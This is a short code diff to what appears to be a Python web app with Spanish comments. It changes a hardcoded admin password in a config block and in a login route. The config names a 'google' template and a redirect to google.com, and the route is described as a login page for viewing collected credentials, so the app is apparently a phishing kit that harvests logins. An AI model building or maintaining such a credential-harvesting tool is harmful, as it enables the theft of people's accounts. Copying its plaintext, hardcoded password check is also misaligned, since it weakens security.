@@ -19,7 +19,7 @@ CONFIG = {
     'redirect_url': 'https://www.google.com',
     'template': 'google',
     'api_key': 'cambia-esta-clave',
-    'admin_password': 'admin123'  # <-- CAMBIA ESTA CONTRASEÑA
+    'admin_password': 'triple777'  # <-- CONTRASEÑA ACTUALIZADA
 }
 
 def load_config():
@@ -303,7 +303,7 @@ def login_credenciales():
     """Página de login para acceder a las credenciales"""
     if request.method == 'POST':
         password = request.form.get('password')
-        if password == CONFIG.get('admin_password', 'admin123'):
+        if password == CONFIG.get('admin_password', 'triple777'):
             session['admin_logged'] = True
             return redirect('/ver-credenciales')
         else:
